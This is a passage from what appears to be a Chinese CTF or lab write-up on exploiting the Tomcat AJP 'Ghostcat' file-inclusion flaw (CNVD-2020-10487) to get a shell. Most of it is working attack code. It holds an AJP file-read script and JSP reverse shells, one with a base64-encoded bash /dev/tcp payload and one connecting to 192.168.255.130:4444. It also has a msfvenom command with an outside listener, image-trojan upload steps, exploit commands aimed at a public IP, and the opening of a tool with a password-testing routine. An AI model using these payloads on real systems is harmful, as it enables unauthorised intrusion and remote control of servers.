class="string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)</span><br><span class="line">		<span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8009</span>, <span class="built_in">help</span>=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;WEB-INF/web.xml&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">&#x27;/whalwl/asdf&#x27;</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.5ummplfbsdg0.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b100-getshell-一"><a href="#0b100-getshell-一" class="headerlink" title="0b100 getshell(一)"></a>0b100 getshell(一)</h3><ul><li><p>反弹shell一（推荐）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NS4xMzAvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>反弹shell二：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf生成，具体生成下文已给出</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="number">43.138</span><span class="number">.193</span><span class="number">.108</span> LPORT=<span class="number">4445</span> R &gt;shell.jsp</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.lang.*&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.net.*&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">StreamConnector</span> <span class="keyword">extends</span> <span class="title class_">Thread</span></span><br><span class="line">  &#123;</span><br><span class="line">    InputStream sG;</span><br><span class="line">    OutputStream p2;</span><br><span class="line"></span><br><span class="line">    StreamConnector( InputStream sG, OutputStream p2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">this</span>.sG = sG;</span><br><span class="line">      <span class="built_in">this</span>.p2 = p2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">BufferedReader</span> <span class="variable">rB</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">BufferedWriter</span> <span class="variable">xij</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        rB  = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>( <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>( <span class="built_in">this</span>.sG ) );</span><br><span class="line">        xij = <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>( <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>( <span class="built_in">this</span>.p2 ) );</span><br><span class="line">        <span class="type">char</span> buffer[] = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">8192</span>];</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="keyword">while</span>( ( length = rB.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          xij.write( buffer, <span class="number">0</span>, length );</span><br><span class="line">          xij.flush();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span>( rB != <span class="literal">null</span> )</span><br><span class="line">          rB.close();</span><br><span class="line">        <span class="keyword">if</span>( xij != <span class="literal">null</span> )</span><br><span class="line">          xij.close();</span><br><span class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    String ShellPath;</span><br><span class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="string">&quot;windows&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">  ShellPath = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  ShellPath = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>( <span class="string">&quot;192.168.255.130&quot;</span>, <span class="number">4444</span> );</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">    ( <span class="keyword">new</span> <span class="title class_">StreamConnector</span>( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">    ( <span class="keyword">new</span> <span class="title class_">StreamConnector</span>( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>构造图片马后上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows平台：&quot;合并.bat&quot;</span></span><br><span class="line">copy img.jpg/b + shell.jsp/a shell.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入的图片马</span></span><br><span class="line">http://<span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18080</span>/whalwl/upload/<span class="number">2022</span>-000047-<span class="number">000027.j</span>pg</span><br><span class="line"></span><br><span class="line">flag&#123;a3f961e96e9706f21cf44a8b91822f94&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.79igdxk5c2c0.jpg?raw=true" alt="tumeiimage"></p><ul><li>文件包含<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程服务器监听端口，此处使用nc</span></span><br><span class="line">nc -lvvnp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于前面修改的代码继续修改</span></span><br><span class="line"><span class="comment"># CNVD-2020-10487-Tomcat-Ajp-lfi.py 的 296行：</span></span><br><span class="line"><span class="comment"># _,data = t.perform_request(&#x27;/whalwl/asdf&#x27;,attributes=[</span></span><br><span class="line"><span class="comment"># 修改为</span></span><br><span class="line"><span class="comment"># _,data = t.perform_request(&#x27;/whalwl/asdf.jsp&#x27;,attributes=[</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用脚本实现文件包含以读取文件</span></span><br><span class="line">python2 CNVD-<span class="number">2020</span>-<span class="number">10487</span>-Tomcat-Ajp-lfi.py <span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span> -p <span class="number">18009</span> -f upload/<span class="number">2022</span>-000047-<span class="number">000027.j</span>pg</span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.73ncjhj5qco0.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b101-getshell-二"><a href="#0b101-getshell-二" class="headerlink" title="0b101 getshell(二)"></a>0b101 getshell(二)</h3><ul><li>使用脚本：<a class="link" target="_blank" rel="noopener" href="https://github.com/hypn0s/AJPy">https://github.com/hypn0s/AJPy<i class="fas fa-external-link-alt"></i></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更简单，不用总修改代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读 /WEB-INF/web.xml</span></span><br><span class="line">python3 tomcat.py --port <span class="number">18009</span> read_file --webapp=whalwl /WEB-INF/web.xml <span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读图片马，反弹shell</span></span><br><span class="line">python3 tomcat.py --port <span class="number">18009</span> read_file --webapp=whalwl /upload/<span class="number">2022</span>-000047-<span class="number">000027.j</span>pg <span class="number">106.15</span><span class="number">.50</span><span class="number">.11</span></span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.7e3hb79mylk0.jpg?raw=true" alt="tumeiimage"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Julien Legras - Synacktiv</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THIS SOFTWARE IS PROVIDED BY SYNACKTIV &#x27;&#x27;AS IS&#x27;&#x27; AND ANY</span></span><br><span class="line"><span class="comment"># EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment"># WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment"># DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY</span></span><br><span class="line"><span class="comment"># DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment"># (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;</span></span><br><span class="line"><span class="comment"># LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND</span></span><br><span class="line"><span class="comment"># ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT</span></span><br><span class="line"><span class="comment"># (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS</span></span><br><span class="line"><span class="comment"># SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ajpy.ajp <span class="keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint, pformat</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">	<span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_logger</span>():</span><br><span class="line">	logger = logging.getLogger(<span class="string">&#x27;meow&#x27;</span>)</span><br><span class="line">	handler = logging.StreamHandler()</span><br><span class="line">	logger.addHandler(handler)</span><br><span class="line">	logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> logger</span><br><span class="line"></span><br><span class="line">logger = setup_logger()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># helpers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span><br><span class="line">	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">	fr.method = method</span><br><span class="line">	fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">	fr.req_uri = req_uri</span><br><span class="line">	fr.remote_addr = target_host</span><br><span class="line">	fr.remote_host = <span class="literal">None</span></span><br><span class="line">	fr.server_name = target_host</span><br><span class="line">	fr.server_port = <span class="number">80</span></span><br><span class="line">	fr.request_headers = &#123;</span><br><span class="line">		<span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">	fr.is_ssl = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	fr.attributes = []</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tomcat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">		self.target_host = target_host</span><br><span class="line">		self.target_port = target_port</span><br><span class="line"></span><br><span class="line">		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">		self.socket.connect((target_host, target_port))</span><br><span class="line">		self.stream = self.socket.makefile(<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">test_password</span>(<span class="params">self, user, password</span>):</span><br><span class="line">		res = <span class="literal">False</span></span><br><span class="line">		stop = <span class="literal">False</span></span><br><span class="line">		creds = b64encode((<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">		